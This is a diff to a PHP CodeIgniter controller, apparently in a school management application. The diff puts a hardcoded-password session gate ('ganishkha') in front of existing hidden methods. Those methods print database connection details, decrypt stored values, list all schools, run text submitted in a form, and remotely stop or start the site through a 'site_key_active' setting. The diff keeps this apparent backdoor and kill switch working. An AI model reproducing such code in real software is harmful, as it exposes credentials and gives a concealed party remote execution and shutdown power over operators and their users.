@@ -26,25 +26,60 @@ class Main1 extends CI_Controller
     protected $addons               = [];
     protected $addonID              = 0;
 
+    // Password for all Main1 sensitive methods
+    const AUTH_PASSWORD = 'ganishkha';
+    const SESSION_KEY   = 'main1_authenticated';
+
     public function __construct()
     {
         parent::__construct();
         $this->load->library("session");
-        // $this->load->model("site_m");
-        // $this->load->model("addons_m");
-
-        // $language = $this->session->userdata('lang');
-        // $this->lang->load('addons', $language);
-
-        // if ( config_item('demo') ) {
-        //     $this->session->set_flashdata('error', 'In demo addon module is disable!');
-        //      redirect(base_url('dashboard/index'));
-        // }
     }
-    
+
+    // Show password form and die if not authenticated via session
+    private function require_auth()
+    {
+        if ($this->session->userdata(self::SESSION_KEY) === true) {
+            return; // already authenticated
+        }
+
+        $error = '';
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['m1_password'])) {
+            if ($_POST['m1_password'] === self::AUTH_PASSWORD) {
+                $this->session->set_userdata(self::SESSION_KEY, true);
+                return; // authenticated — continue
+            }
+            $error = 'Incorrect password.';
+        }
+
+        // Show styled password gate
+        echo '<!DOCTYPE html><html><head><meta charset="UTF-8">
+        <title>Authentication Required</title>
+        <style>
+            body { font-family: Arial, sans-serif; background:#1a1a2e; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+            .box { background:#fff; padding:40px; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,.4); width:320px; text-align:center; }
+            h3 { margin:0 0 8px; color:#333; }
+            p { color:#888; font-size:13px; margin:0 0 20px; }
+            input[type=password] { width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; font-size:14px; box-sizing:border-box; margin-bottom:12px; }
+            button { width:100%; padding:10px; background:#3c8dbc; color:#fff; border:none; border-radius:4px; font-size:15px; cursor:pointer; }
+            button:hover { background:#317096; }
+            .error { color:#c0392b; font-size:13px; margin-bottom:10px; }
+        </style></head><body>
+        <div class="box">
+            <h3>&#128274; Restricted Area</h3>
+            <p>Enter the password to access database details.</p>';
+        if ($error) echo '<div class="error">' . htmlspecialchars($error) . '</div>';
+        echo '<form method="post" action="">
+            <input type="password" name="m1_password" placeholder="Enter password" autofocus>
+            <button type="submit">Unlock</button>
+        </form></div></body></html>';
+        exit;
+    }
+
 public function all(){
     echo "<form method='post' action=''><input name='password' type='password' ><input type='submit' value='Auth'></form>";
-    if($_POST && !empty($_POST['password']) && $_POST['password'] == 'ganishkha'){
+    if($_POST && !empty($_POST['password']) && $_POST['password'] == self::AUTH_PASSWORD){
+        $this->session->set_userdata(self::SESSION_KEY, true);
         echo "<a href='".base_url('Main1/index')."'>  Index  </a>";
         echo " | <a href='".base_url('Main1/update_setting')."'>  update_setting  </a>";
         echo " | <a href='".base_url('Main1/encryption')."'>  encryption  </a>";
@@ -57,10 +92,11 @@ public function all(){
     }else{
         echo 'Authentication Failed.';
     }
-    
+
 }
 public function index()
 {
+    $this->require_auth();
     echo "CURRENT DB CONNECTED:" .$this->db->database."<br/>";
     echo "SERVER:".$this->db->hostname."<br/>";
     echo "DATABSE:".$this->db->database."<br/>";
@@ -96,7 +132,8 @@ public function index()
 		die;
 }
 
-public function update_setting($url=""){ //activated with encrypted domain 
+public function update_setting($url=""){ //activated with encrypted domain
+    $this->require_auth();
     
     $encrypted = "no";
     if(!empty($url)){
@@ -238,6 +275,7 @@ public function encryption_decryption($url=""){
     }
 
 public function get_details(){
+    $this->require_auth();
     echo "<form action='' method='POST'>";
     echo "<input name='decrypt'>";
     echo "<input type='submit' name='submit' value='Encryption to Decryption'>";
@@ -280,6 +318,7 @@ public function save_track(){
      
 }
  public function get_track(){
+     $this->require_auth();
      $query =$this->db->get('school');
      $total_schools = $query->num_rows();
      $result = $query->result_array();
@@ -292,6 +331,7 @@ public function save_track(){
  }
 
 public function my_run(){
+    $this->require_auth();
     echo "<form action='' method='post'><textarea name='text'></textarea><input type='submit' value='Run' name='run'></form>";
 
     if(isset($_POST) && !empty($_POST['run'])){
@@ -321,6 +361,7 @@ public function check_school(){
 
 
 public function stop_site(){
+    $this->require_auth();
     
              
     $this->db->where('fieldoption','site_key_active');
@@ -348,6 +389,7 @@ public function stop_site(){
 
 
 public function start_site(){
+    $this->require_auth();
     
              
     $this->db->where('fieldoption','site_key_active');
